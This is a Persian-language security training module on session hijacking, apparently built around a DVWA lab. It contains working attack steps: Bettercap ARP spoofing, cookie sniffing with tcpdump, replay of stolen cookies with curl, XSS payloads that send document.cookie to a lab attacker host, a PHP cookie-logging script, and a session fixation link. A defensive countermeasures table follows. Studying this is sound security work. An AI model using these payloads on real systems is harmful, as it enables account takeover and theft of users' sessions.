# ربودن نشست (Session Hijacking)

**مدت یادگیری**: ۳ ساعت
**سطح سختی**: متوسط
**پیش‌نیاز**: فایل ۱۰ (شنود) و ۱۵ (وب)

---

## فهرست محتوا

- [فصل ۱: مقدمه](#فصل-۱-مقدمه)
- [فصل ۲: ربودن نشست در سطح شبکه](#فصل-۲-ربودن-نشست-در-سطح-شبکه)
- [فصل ۳: ربودن نشست در سطح اپلیکیشن](#فصل-۳-ربودن-نشست-در-سطح-اپلیکیشن)
- [فصل ۴: آزمایشگاه و اقدامات متقابل](#فصل-۴-آزمایشگاه-و-اقدامات-متقابل)

---

## فصل ۱: مقدمه

### مقدمه

**Session Hijacking (ربودن نشست)** یعنی تصاحب یک نشست فعال کاربر برای دسترسی بدون نیاز به رمز. وقتی کاربر وارد می‌شود، سرور یک **Session ID** می‌دهد؛ اگر مهاجم این ID را بدزدد، می‌تواند خود را جای کاربر جا بزند.

> **تشبیه:** مثل این است که کسی کارت ورود شما به ساختمان را دزدیده باشد — دیگر لازم نیست رمز بداند.

### مفاهیم اساسی

**سه بخش یک نشست:**
1. **Session ID (Token):** شناسه یکتا (کوکی، URL، هدر).
2. **Server-side state:** اطلاعات نشست در سرور.
3. **Client-side state:** کوکی یا Storage در مرورگر.

**دو سطح حمله:**
- **Network-level:** رهگیری بسته‌ها و حدس/دزدیدن Session ID (با Sniffing و MITM).
- **Application-level:** دزدیدن کوکی با XSS یا حدس‌زدن ID ضعیف.

**انواع حمله:**
- **Session Fixation:** تحمیل Session ID مشخص به قربانی.
- **Session Sidejacking:** دزدیدن کوکی در شبکه بدون رمز.
- **Cross-site Scripting (XSS):** دزدیدن کوکی با JavaScript.
- **Predictable Session ID:** حدس ID ضعیف.

### نکات مهم (Tips & Tricks)

- **HTTPS + Secure Cookie + HttpOnly + SameSite** دفاع اصلی.
- Session ID باید **تصادفی، طولانی و غیرقابل‌حدس** باشد.
- **Session Timeout** کوتاه، پنجره حمله را کم می‌کند.

### خلاصه فصل

- Session Hijacking = تصاحب نشست فعال.
- دو سطح: شبکه و اپلیکیشن.
- دفاع: HTTPS، کوکی امن، ID تصادفی.

---

## فصل ۲: ربودن نشست در سطح شبکه

### مقدمه

در این سطح، مهاجم با **Sniffing** و **MITM** ترافیک را می‌بیند و Session ID را می‌دزدد.

### مفاهیم اساسی

**پیش‌نیاز:** ترافیک بدون رمز (HTTP) یا رمزگشایی‌شده.
**ابزارها:** Wireshark، Bettercap، Ettercap، Hamster/Ferret.

**سه روش:**
1. **Passive:** فقط رهگیری (در شبکه هاب یا Wi-Fi).
2. **Active (MITM):** قرار گرفتن میان قربانی و سرور.
3. **Blind Hijacking:** بدون دیدن پاسخ‌ها، حدس و تزریق (سخت).

### مثال عملی

```bash
# === ۱. راه‌اندازی MITM با Bettercap ===
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo bettercap -iface eth0
# net.probe on
# set arp.spoof.targets 192.168.56.101
# arp.spoof on
# net.sniff on

# === ۲. شکار کوکی با Wireshark ===
sudo tcpdump -i eth0 -A 'tcp port 80' | grep -i "cookie"
# یا در Wireshark فیلتر: http.cookie

# === ۳. استفاده از کوکی دزدیده‌شده ===
# در مرورگر: با افزونه EditThisCookie کوکی را ست کنید
# یا با curl:
curl -b "PHPSESSID=stolen_session_id" http://target/dashboard
```

### اشکال شایع

- **مشکل:** کوکی نمی‌بینم → ترافیک HTTPS است؛ نیاز به رمزگشایی دارید.
- **مشکل:** کوکی دزدیده‌شده کار نمی‌کند → IP Binding یا انقضای نشست.
- **مشکل:** بعد از تست، شبکه خراب است → ARP را ریست کنید.

### نکات مهم (Tips & Tricks)

- **Cookie Flags:** Secure (فقط HTTPS)، HttpOnly (غیرقابل دسترسی JS)، SameSite.
- **HSTS** جلوی SSL Stripping را می‌گیرد.
- Session Binding (به IP/User-Agent) تشخیص را سخت‌تر می‌کند.

### خلاصه فصل

- سطح شبکه: Sniffing + MITM.
- Wireshark و Bettercap ابزارهای اصلی.
- کوکی دزدیده‌شده = دسترسی کامل.

---

## فصل ۳: ربودن نشست در سطح اپلیکیشن

### مقدمه

در سطح اپلیکیشن، مهاجم از **آسیب‌پذیری وب** برای دزدیدن یا حدس Session ID استفاده می‌کند.

### مفاهیم اساسی

**روش‌ها:**
1. **XSS:** تزریق JS برای ارسال کوکی به مهاجم.
2. **Session Fixation:** تحمیل ID مشخص.
3. **Predictable ID:** حدس ID ضعیف (ترتیبی یا زمان‌محور).
4. **CSRF:** سوءاستفاده از نشست معتبر برای انجام عمل.
5. **Malware/Browser Extension:** دزدیدن کوکی از مرورگر.

### مثال عملی

```javascript
// === XSS برای دزدیدن کوکی (آموزشی) ===
// در یک فیلد آسیب‌پذیر تزریق کنید:
<script>new Image().src="http://192.168.56.10/steal?c="+document.cookie;</script>

// روی سرور مهاجم (Kali):
python3 -m http.server 80
// کوکی در لاگ سرور ظاهر می‌شود
```

```html
<!-- === Session Fixation === -->
<!-- مهاجم لینکی با Session ID مشخص می‌فرستد -->
http://target/login.php?PHPSESSID=known_id_12345
<!-- اگر اپلیکیشن ID را بعد از ورود تغییر ندهد، مهاجم نشست را تصاحب می‌کند -->
```

### اشکال شایع

- **مشکل:** XSS فیلتر شده → از تکنیک‌های Bypass یا DOM-based استفاده کنید.
- **مشکل:** کوکی HttpOnly است → JS نمی‌تواند بخواند (دفاع مؤثر).
- **مشکل:** Session ID بعد از ورود عوض می‌شود → Session Fixation شکست می‌خورد.

### نکات مهم (Tips & Tricks)

- **HttpOnly** دزدیدن کوکی با XSS را خنثی می‌کند.
- اپلیکیشن باید بعد از ورود، **Session ID را بازتولید** کند.
- **CSRF Token** جلوی CSRF را می‌گیرد.
- ID باید **رمزنگاری‌شده و تصادفی** باشد (مثلاً ۱۲۸ بیت).

### خلاصه فصل

- سطح اپلیکیشن: XSS، Fixation، Predictable ID، CSRF.
- HttpOnly و بازتولید ID دفاع‌های کلیدی‌اند.
- CSRF Token برای جلوگیری از سوءاستفاده نشست.

---

## فصل ۴: آزمایشگاه و اقدامات متقابل

### مقدمه

یک آزمایشگاه کامل Session Hijacking روی DVWA.

### مثال عملی — آزمایشگاه

```bash
# === ۱. آماده‌سازی ===
# DVWA با امنیت Low

# === ۲. ورود به DVWA ===
# http://192.168.56.101/dvwa
# کاربر: admin / رمز: password

# === ۳. XSS برای دزدیدن کوکی ===
# در صفحه XSS (Reflected):
<script>document.location='http://192.168.56.10/c.php?c='+document.cookie</script>

# سرور مهاجم:
cat > /var/www/html/c.php <<'EOF'
<?php
$f = fopen("cookies.txt","a");
fwrite($f, $_GET['c']."\n");
fclose($f);
?>
EOF
sudo service apache2 start

# === ۴. استفاده از کوکی ===
# کوکی دزدیده‌شده را در مرورگر ست کنید و به DVWA برگردید

# === ۵. Session Fixation تست ===
# بررسی کنید ID بعد از ورود عوض می‌شود یا نه
```

### اشکال شایع

- **مشکل:** DVWA امنیت High → XSS کار نمی‌کند؛ روی Low تست کنید.
- **مشکل:** کوکی کار نمی‌کند → بررسی کنید Session معتبر است.

### نکات مهم (Tips & Tricks)

- DVWA اهداف تمرینی در سطوح Low/Medium/High دارد.
- بعد از دزدیدن کوکی، **سرعت عمل** مهم است (نشست منقضی می‌شود).
- تست را در محیط ایزوله انجام دهید.

### اقدامات متقابل (Countermeasures)

| حمله | راهکار دفاعی |
|------|--------------|
| Network Sniffing | HTTPS/TLS اجباری |
| Session Sidejacking | Cookie Secure Flag |
| XSS | HttpOnly، CSP، ورودی‌پالایی |
| Session Fixation | بازتولید ID پس از ورود |
| Predictable ID | ID تصادفی رمزنگاری‌شده |
| CSRF | CSRF Token، SameSite |
| SSL Strip | HSTS |

### خلاصه فصل

- آزمایشگاه: XSS → دزدیدن کوکی → استفاده.
- DVWA محیط تمرین عالی است.
- دفاع چندلایه: HTTPS + Flags + CSP + Token.

---

## منابع و مراجع

- **OWASP Session Management:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **OWASP XSS:** https://owasp.org/www-community/attacks/xss/
- **OWASP CSRF:** https://owasp.org/www-community/attacks/csrf
- **DVWA:** https://github.com/digininja/DVWA
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
- **Cookie Flags:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
